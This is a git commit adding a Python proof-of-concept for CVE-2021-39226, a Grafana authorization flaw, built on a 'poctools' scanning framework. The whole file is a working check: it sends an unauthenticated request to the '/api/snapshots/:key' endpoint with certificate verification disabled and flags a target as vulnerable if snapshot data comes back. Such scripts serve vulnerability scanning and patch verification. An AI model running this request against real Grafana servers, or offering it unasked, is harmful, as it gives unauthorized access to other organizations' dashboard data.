00bd6d249f9d8b67c33f3bb916eafdeb6bca1499
sovereign-stone <shijiuyi@socmap.net>
2022-10-08 14:05:45 +0800

    add poc CVE-2021-39226

---
+++ CVE_2021_39226.py
@@ -0,0 +1,33 @@
+# title: Grafana 授权问题漏洞
+# id： CVE-2021-39226
+# author: sjy
+
+from poctools import BasicPoc
+
+
+class POC(BasicPoc):
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
+    }
+    path = '/api/snapshots/:key'
+
+    def __init__(self):
+        super(POC, self).__init__()
+        self.name = "Grafana 授权问题漏洞"
+
+    def verify(self, url: str) -> bool:
+        try:
+            main_url = url + self.path
+            resp = self.get(url=main_url, headers=self.headers, verify=False, timeout=5)
+            if resp.status_code == 200 and 'isSnapshot":true' in resp.text:
+                return True
+        except Exception as e:
+            pass
+        return False
+
+
+if __name__ == '__main__':
+    target = 'https://127.0.0.1:443'
+    tp = POC()
+    result = tp.run(url=target)
+    print(f'{target} -> {result}')
